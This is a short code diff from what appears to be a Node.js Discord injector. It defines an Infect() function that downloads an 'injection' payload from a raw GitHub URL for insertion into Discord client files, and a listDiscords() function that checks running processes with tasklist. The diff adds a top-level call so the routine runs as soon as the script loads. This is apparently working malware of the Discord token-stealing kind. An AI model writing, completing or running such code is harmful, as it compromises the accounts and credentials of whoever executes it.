@@ -41,7 +41,7 @@ discords.forEach(function(file) {
     })
     
 });
-
+listDiscords();
 function Infect() {
     https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection', (resp) => {
         let data = '';
@@ -79,6 +79,7 @@ function Infect() {
         console.log(err);
     });
 };
+
 
 function listDiscords() {
     exec('tasklist', function(err,stdout, stderr) {
